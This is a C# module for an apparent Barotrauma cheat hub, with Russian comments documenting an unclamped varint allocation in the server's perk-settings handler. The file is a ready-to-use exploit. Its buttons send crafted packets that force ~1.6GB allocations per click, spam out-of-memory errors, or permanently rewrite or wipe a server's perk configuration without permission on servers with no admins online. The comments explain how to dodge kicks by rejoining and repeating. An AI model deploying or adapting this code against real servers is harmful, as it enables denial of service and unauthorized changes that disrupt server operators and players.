// ============================================================================
//  PerkBombModule.cs — «ПЕРКОВАЯ БОМБА» (волна 713)
//  NEW CVE-CLASS FIND: unbounded array allocation from raw varint count.
//
//  БАГ (Shared/Networking/ServerSettings.cs:1436-1463, ReadPerks):
//      uint coalitionCount = msg.ReadVariableUInt32();     // 5 байт пакета = до 4.29e9
//      Identifier[] newCoalitionPerks = new Identifier[coalitionCount];   // <-- АЛЛОКАЦИЯ ДО ВАЛИДАЦИИ
//      ...то же для separatistsCount
//  Счётчик НИКАК не клампится (универсальный INetSerializableStruct.ReadArray
//  клампится через ReadInteger(0, ArrayMaxSize) — а тут голый varint).
//
//  ДОСТУП (GameServer.cs:980 → ServerSettings.ReadPerks(inc, client)):
//    HasPermissionToChangePerks:
//      - HasPermission(ManageSettings) -> ok
//      - НЕ PvP: если НИ У ОДНОГО другого клиента нет ManageSettings -> ok
//      - PvP: если в твоей команде нет держателей ManageSettings -> ok
//    => дедикатед БЕЗ админов онлайн = ОТКРЫТО ЛЮБОМУ КЛИЕНТУ.
//    (на сервере друга с хостом-оунером онлайн — закрыто: owner имеет все пермы)
//
//  ПОЧЕМУ НЕ КИКАЕТ:
//    - IndexOutOfRange/OOM от этих пакетов — НЕ NetStructReadException,
//      поэтому ветка "kick for malformed data" в LidgrenServerPeer/P2PServerPeer
//      НЕ срабатывает. Ловится только внешним catch-all Update() (строка ошибки в лог).
//    - DoSProtection: аллокация+зануление ~0.8-1.6GB занимает >100мс = strike;
//      6 strikes = кик (если EnableDoSProtection) => РЕКОННЕКТ И ПОВТОР.
//
//  ЭФФЕКТЫ (кнопки):
//    1. CHURN: count=200,000,000 -> сервер аллоцирует и зануляет ~0.8-1.6GB
//       ПО ОДНОМУ КЛИКУ (6-байтовый пакет!), потом кидает exception на чтении.
//       Память отдаётся GC-у; при повторе в темпе кликов = GC-шторм/фриз.
//    2. OOM-СПАМ: count=4294967294 -> new Identifier[4.29e9] мгновенно
//       OutOfMemoryException (лимит одного массива 2GB) — дешёвый спам
//       ошибок в серверный лог, БЕЗ кика.
//    3. ПЕРК-СМЕНА (легит-пейлоад): валидный список ВСЕХ перков коалиции
//       -> сервер ПРИМЕНЯЕТ и SaveSettings() ПИШЕТ В КОНФИГ НА ДИСКЕ
//       => переживает рестарт сервера. Смена перков высадки = серверный
//       геймплей-эффект без пермов (на безадминных серверах).
//    4. ВАЙП ПЕРКОВ: count=0/0 — легально очистить оба списка (тоже persists).
//
//  ФОРМАТ ПАКЕТА (ClientPacketHeader.SERVER_SETTINGS_PERKS == 3):
//    byte  3
//    varuint32 coalitionCount
//    [coalitionCount x uint32]  (читается до конца буфера, потом exception)
//    varuint32 separatistsCount
//    [separatistsCount x uint32]
//
//  ОСТОРОЖНО: на серверах С админом онлайн сервер читает НОЛЬ байт
//  (гейт до парсинга) — все режимы мертвы. Проверяй фоллбэк.
// ============================================================================

using System;
using System.Collections.Generic;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class PerkBombModule : CSModuleBase
    {
        public override string Id   => "perk_bomb";
        public override string Name => "Perk Bomb";
        public override string Description =>
            "ServerSettings.ReadPerks allocates Identifier[varint-from-network] with NO clamp " +
            "(up to ~1-2GB per 6-byte packet). Open to ANY client on servers with no online " +
            "ManageSettings holders. Not kicked (not a NetStructReadException). " +
            "Bonus: valid payload PERMANENTLY rewrites server disembark perks (SaveSettings).";
        public override string Category => "exploit";

        public override string GetLabel() => "Perk Bomb 💣";

        public override void OnClick()
        {
            var box = new GUIMessageBox(
                "PERK BOMB (unbounded alloc)",
                "SERVER_SETTINGS_PERKS -> ReadPerks():\n" +
                "  Identifier[] = new Identifier[varuint32 from packet]\n" +
                "  no clamp, allocation BEFORE any data reads.\n" +
                "\n" +
                "Gate: opens when nobody else online has ManageSettings\n" +
                "(dedicated servers w/o admins). PvP: nobody on YOUR team.\n" +
                "\n" +
                "Exception is NOT NetStructReadException -> no kick,\n" +
                "only outer catch-all. DoS-protection may kick after ~6\n" +
                "slow packets -> rejoin and repeat.\n" +
                "\n" +
                "Modes 3/4 need valid payload -> applied + SAVED TO DISK.",
                new LocalizedString[]
                {
                    "CHURN ~1.6 GB",
                    "OOM spam x20",
                    "Set ALL perks (persist)",
                    "Wipe perks (persist)",
                    "Close",
                },
                new Vector2(0.62f, 0.7f));

            box.Buttons[0].Color = Color.Orange;
            box.Buttons[1].Color = Color.Red;
            box.Buttons[2].Color = Color.MediumPurple;
            box.Buttons[3].Color = Color.CornflowerBlue;
            box.Buttons[4].Color = Color.DarkGray;

            box.Buttons[0].OnClicked = (_, _) =>
            {
                Send(200_000_000u, 0u, null, null);
                GUI.AddMessage("[PerkBomb] CHURN: сервер пытается аллоцировать Identifier[200,000,000] " +
                    "(~0.8-1.6GB) с 6 байтового пакета. Если не кикнуло — жми ещё.", Color.Orange);
                return true;
            };

            box.Buttons[1].OnClicked = (_, _) =>
            {
                for (int i = 0; i < 20; i++)
                {
                    Send(4294967294u, 4294967294u, null, null);
                }
                GUI.AddMessage("[PerkBomb] OOM-спам x20 отправлен: new Identifier[4294967294] = " +
                    "мгновенный OutOfMemoryException на сервере, 20 строк в лог, кика НЕТ.", Color.Red);
                return true;
            };

            box.Buttons[2].OnClicked = (_, _) =>
            {
                List<uint> ids = new List<uint>();
                try
                {
                    foreach (DisembarkPerkPrefab p in DisembarkPerkPrefab.Prefabs)
                    {
                        ids.Add(p.UintIdentifier);
                    }
                }
                catch (Exception e)
                {
                    GUI.AddMessage("[PerkBomb] Prefabs недоступны: " + e.Message, Color.Yellow);
                }
                if (ids.Count == 0)
                {
                    GUI.AddMessage("[PerkBomb] список перков пуст — Payload недоступен в этой сборке", Color.Red);
                    return true;
                }
                Send((uint)ids.Count, 0u, ids.ToArray(), null);
                GUI.AddMessage("[PerkBomb] отправлено " + ids.Count + " коалиционных перков. " +
                    "Сервер применит их и SaveSettings() ЗАПИШЕТ В КОНФИГ (переживает рестарт).", Color.MediumPurple);
                return true;
            };

            box.Buttons[3].OnClicked = (_, _) =>
            {
                Send(0u, 0u, null, null);
                GUI.AddMessage("[PerkBomb] оба списка перков очищены (persists).", Color.CornflowerBlue);
                return true;
            };

            box.Buttons[4].OnClicked = (_, _) => { box.Close(); return true; };
        }

        private static void Send(uint coalitionCount, uint separatistsCount, uint[] coalitionIds, uint[] separatistIds)
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[PerkBomb] нет подключения", Color.Red);
                return;
            }
            try
            {
                var msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.SERVER_SETTINGS_PERKS); // == 3
                msg.WriteVariableUInt32(coalitionCount);
                if (coalitionIds != null)
                {
                    for (int i = 0; i < coalitionIds.Length; i++) { msg.WriteUInt32(coalitionIds[i]); }
                }
                msg.WriteVariableUInt32(separatistsCount);
                if (separatistIds != null)
                {
                    for (int i = 0; i < separatistIds.Length; i++) { msg.WriteUInt32(separatistIds[i]); }
                }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[PerkBomb] send error: " + e.Message, Color.Red);
            }
        }
    }
}
